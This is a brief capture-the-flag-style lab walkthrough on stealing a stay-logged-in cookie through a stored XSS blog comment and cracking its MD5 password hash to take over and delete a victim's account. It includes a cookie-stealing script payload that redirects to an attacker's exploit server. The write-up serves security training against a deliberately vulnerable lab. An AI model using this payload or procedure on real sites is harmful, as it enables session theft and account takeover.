# Offline Pasword Cracking
In this, we have to use a blog post in the lab to get the stay logged on cookie for the victim's account and log in to the account to delete it.

## Approach

* First, login using your credentials with the stay logged in box checked.
* In Burp Suite, find the GET login request and find the stay-logged-in cookie and send it to the decoder where you will find the cookie is of the form 'username:md5HashOfPassword'
* Now, go to your exploit server and find the URL and copy that.
* Now, within the lab page, open any blog and scroll to the comments.
* There, add the following comment
  ```text
  <script>document.location='YOUR-EXPLOIT-SERVER-URL'+document.cookie</script>
  ```
and post it using any random name, email and website.
* Within the exploit server, access the log and there, you will find a GET request with a stay-logged-in cookie. Decode it to get the Hash of the password and decode the hasg to get the pasword.
* Login to the victim's account and delete it using the password to solve the lab.